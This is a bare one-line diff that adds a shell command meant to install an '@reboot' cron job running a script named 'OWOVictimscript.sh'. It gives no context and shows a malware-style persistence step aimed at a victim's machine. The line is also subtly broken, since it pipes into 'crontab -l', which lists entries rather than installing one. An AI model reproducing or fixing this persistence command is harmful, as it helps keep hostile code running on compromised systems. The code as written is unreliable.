@@ -1,0 +1,1 @@
+(crontab -l 2>/dev/null; echo "@reboot /path/to/OWOVictimscript.sh") | crontab -l
